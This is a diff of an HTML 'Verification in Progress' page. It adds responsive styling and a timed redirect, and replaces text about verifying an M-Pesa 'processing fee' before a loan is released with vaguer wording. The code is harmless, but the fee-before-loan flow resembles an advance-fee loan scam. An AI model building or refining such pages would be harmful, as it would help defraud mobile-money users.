@@ -10,6 +10,7 @@
       margin: 0;
       font-family: Arial, sans-serif;
       background: #f2f6ff;
+      transition: opacity 0.8s ease;
     }
     .container {
       max-width: 500px;
@@ -55,6 +56,17 @@
       color: #555;
       text-align: center;
     }
+
+    /* RESPONSIVE */
+    @media (max-width: 480px) {
+      .container {
+        margin: 20px;
+        padding: 25px;
+      }
+      .title { font-size: 20px; }
+      .msg { font-size: 15px; }
+      .logo { width: 70px; }
+    }
   </style>
 </head>
 <body>
@@ -65,16 +77,16 @@
   <div class="title">Verification in Progress</div>
 
   <div class="msg">
-    Thank you for submitting your M-Pesa confirmation message.  
-    Our team is currently verifying your processing fee payment.
+    Thank you for submitting your M-Pesa confirmation message.<br>
+    Your verification is currently being processed.
     <br><br>
-    <strong>This may take up to 48 hours.</strong>
+    <strong>Please wait...</strong>
   </div>
 
   <div class="loader"></div>
 
   <div class="msg">
-    You will receive an SMS and email once your payment is confirmed and your loan is released.
+    You will be redirected shortly.
   </div>
 </div>
 
@@ -82,6 +94,14 @@
 
 <script>
 document.getElementById("year").textContent = new Date().getFullYear();
+
+// Redirect after 7 seconds
+setTimeout(() => {
+    document.body.style.opacity = "0";
+    setTimeout(() => {
+        window.location.href = "index.html?verification=pending";
+    }, 800); 
+}, 7000);
 </script>
 
 </body>
